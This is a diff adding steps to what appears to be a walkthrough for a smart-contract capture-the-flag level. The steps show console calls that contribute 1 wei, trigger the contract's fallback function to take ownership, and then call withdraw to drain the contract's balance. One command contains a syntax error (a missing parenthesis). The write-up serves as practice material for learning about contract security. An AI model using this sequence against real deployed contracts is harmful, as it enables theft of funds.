@@ -18,3 +18,16 @@ In order to do that all we need to is call the contribute function inside our we
     owner.transfer(address(this).balance);
   }
   ```
+  To contribute all you need to do is call 
+  ```
+  contract.contribute({value:1})
+  ```
+  1 which would be one WEI and to get an idea 1 ether is 10^18 wei
+  After that we are part of the mapping then all we need to do is call fallback function in our console just by doing this in web console 
+ ```
+ contract.sendTransaction{value:1})
+```
+After you just call the withdraw funnction and see that the contract got drained and you can submit your instance 
+```
+contract.withdraw()
+```
